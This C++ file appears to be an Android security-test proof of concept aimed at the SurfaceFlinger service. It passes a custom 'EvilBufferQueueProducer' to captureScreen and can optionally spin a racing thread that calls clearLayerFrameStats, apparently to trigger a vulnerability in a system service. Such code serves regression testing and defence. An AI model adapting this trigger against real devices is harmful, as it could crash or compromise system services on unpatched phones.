/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/wait.h>

#define LOG_TAG "GUI"

#include <binder/IServiceManager.h>
#include <fcntl.h>
#include <gui/BufferQueue.h>
#include <jni.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include <media/stagefright/foundation/ADebug.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include "cutils/log.h"
#include "utils/String8.h"

#include <gui/GLConsumer.h>
#include <gui/IGraphicBufferProducer.h>
#include <gui/ISurfaceComposer.h>
#include <gui/Surface.h>
#include <gui/SurfaceComposerClient.h>

#include <gui/BufferQueue.h>
#include <gui/BufferQueueConsumer.h>
#include <gui/BufferQueueCore.h>
#include <gui/BufferQueueProducer.h>
#include <ui/Rect.h>
#include "BufferQueueProducer.h"

using namespace android;

sp<IGraphicBufferProducer> producer;
sp<IGraphicBufferConsumer> consumer;

static sp<ANativeWindow> gSurface;
sp<SurfaceComposerClient> composerClient;
sp<SurfaceControl> control;
sp<IBinder> handle;
sp<ISurfaceComposerClient> mClient;
sp<IGraphicBufferProducer> gbp;

#if MUTI_THREAD
void* run(void* ptr) {
  while (1) {
    mClient->clearLayerFrameStats(handle);
  }
  return NULL;
}
#endif

void createBufferQueue(sp<IGraphicBufferProducer>* outProducer,
                       sp<IGraphicBufferConsumer>* outConsumer) {
  LOG_ALWAYS_FATAL_IF(outProducer == NULL,
                      "BufferQueue: outProducer must not be NULL");
  LOG_ALWAYS_FATAL_IF(outConsumer == NULL,
                      "BufferQueue: outConsumer must not be NULL");

  sp<BufferQueueCore> core(new BufferQueueCore(NULL));
  LOG_ALWAYS_FATAL_IF(core == NULL,
                      "BufferQueue: failed to create BufferQueueCore");

  sp<IGraphicBufferProducer> producer(new EvilBufferQueueProducer(core));
  LOG_ALWAYS_FATAL_IF(producer == NULL,
                      "BufferQueue: failed to create BufferQueueProducer");

  sp<IGraphicBufferConsumer> consumer(new BufferQueueConsumer(core));
  LOG_ALWAYS_FATAL_IF(consumer == NULL,
                      "BufferQueue: failed to create BufferQueueConsumer");

  *outProducer = producer;
  *outConsumer = consumer;
}

int main() {
  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> binder = sm->getService(String16("SurfaceFlinger"));
  sp<ISurfaceComposer> sc = interface_cast<ISurfaceComposer>(binder);
  if (sc == NULL) {
    ALOGI("SurfaceComposer == NULL");
    return 0;
  }
  sp<IGraphicBufferProducer> producer;
  sp<IGraphicBufferConsumer> consumer;
  createBufferQueue(&producer, &consumer);
  IGraphicBufferProducer::QueueBufferOutput bufferOutput;
  sp<CpuConsumer> cpuConsumer = new CpuConsumer(consumer, 1);
  sp<IBinder> display(sc->getBuiltInDisplay(ISurfaceComposer::eDisplayIdMain));
  sc->captureScreen(display, producer, Rect(), 64, 64, 0, 0x7fffffff, false);

#if MUTI_THREAD
  pthread_t pt;
  pthread_create(&pt, NULL, run, NULL);
#endif

  return 0;
}
